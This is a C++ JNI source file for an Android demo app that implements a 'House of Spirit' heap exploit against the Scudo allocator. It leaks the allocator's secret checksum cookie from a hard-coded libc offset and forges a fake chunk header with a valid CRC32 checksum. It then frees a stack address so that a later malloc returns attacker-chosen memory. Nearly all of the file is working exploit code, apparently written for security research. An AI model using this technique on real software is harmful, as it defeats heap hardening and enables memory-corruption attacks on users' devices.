#include <jni.h>
#include <string>
#include <link.h>

// Taken from scudo source
typedef struct UnpackedHeader {
    uintptr_t ClassId : 8;
    uint8_t State : 2;
    // Origin if State == Allocated, or WasZeroed otherwise.
    uint8_t OriginOrWasZeroed : 2;
    uintptr_t SizeOrUnusedBytes : 20;
    uintptr_t Offset : 16;
    uintptr_t Checksum : 16;
} UnpackedHeader;

static uintptr_t libc_base;
static uint32_t cookie;
static char* victim;

static int cb(struct dl_phdr_info *info, size_t size, void *data) {
    if (info->dlpi_name && strstr(info->dlpi_name, "/libc.so")) {
        libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

uint32_t leak_scudo_cookie() {
    dl_iterate_phdr(cb, nullptr);
    return *(volatile uint32_t *)(libc_base + 0x0f7480);
}

uint64_t pack_header(UnpackedHeader unpacked_header) {
    uint64_t conv;
    std::memcpy(&conv, &unpacked_header, sizeof(uint64_t));
    return conv & 0x00ffffffffffffffULL;
}

// Taken from Scudo source
static uint32_t crc32_u64(uint32_t crc, uint64_t v) {
    crc ^= (uint32_t)v;
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    crc ^= (uint32_t)(v >> 32);
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    return crc;
}

static uintptr_t scudo_header_checksum(uintptr_t user_ptr,
                                      uint64_t packed_header) {
    uint64_t zeroed = packed_header & 0x0000ffffffffffffULL;

    uint32_t crc = crc32_u64(cookie, (uint64_t)user_ptr);
    crc = crc32_u64(crc, zeroed);

    return (uintptr_t)(crc ^ (crc >> 16));
}

extern "C" JNIEXPORT jlong JNICALL
Java_xyz_cygnusx_house_1of_1spirit_MainActivity_leakCookie(
        JNIEnv* env,
        jobject /* this */) {
    cookie = leak_scudo_cookie();
    return static_cast<jlong>(cookie);
}

extern "C" JNIEXPORT jlong JNICALL
Java_xyz_cygnusx_house_1of_1spirit_MainActivity_buildFakeChunk(
        JNIEnv* env,
        jobject /* this */) {

    // build a fake scudo header with a valid checksum.
    UnpackedHeader unpacked_header = {};
    unpacked_header.ClassId = 1; // smallest class
    unpacked_header.State = 1; // allocated
    unpacked_header.SizeOrUnusedBytes = 0; // not useful
    unpacked_header.OriginOrWasZeroed = 0;
    unpacked_header.Offset = 0;
    uint64_t packed_header = pack_header(unpacked_header);

    // data points to the user returned pointer
    char* data = (char*)(&unpacked_header) + 0x10;

    // scudo checksum wants a tagged heap pointer
    uintptr_t user = (long) data & 0x00ffffffffffffffULL;
    uintptr_t scudo_ptr = user | 0x0200000000000000ULL;
    unpacked_header.Checksum = scudo_header_checksum(scudo_ptr, packed_header);

    // get our fake chunk on the freelist
    free(data);

    // Immediately malloc to minimize the chance another thread steals our chunk
    victim = (char*)malloc(0x10);

    // Return the user-pointer to our fake chunk
    return static_cast<jlong>(reinterpret_cast<uintptr_t>(data));
}


extern "C" JNIEXPORT jlong JNICALL
Java_xyz_cygnusx_house_1of_1spirit_MainActivity_getVictimAddr(
        JNIEnv* env,
        jobject /* this */) {
    return static_cast<jlong>(reinterpret_cast<uintptr_t>(victim));
}
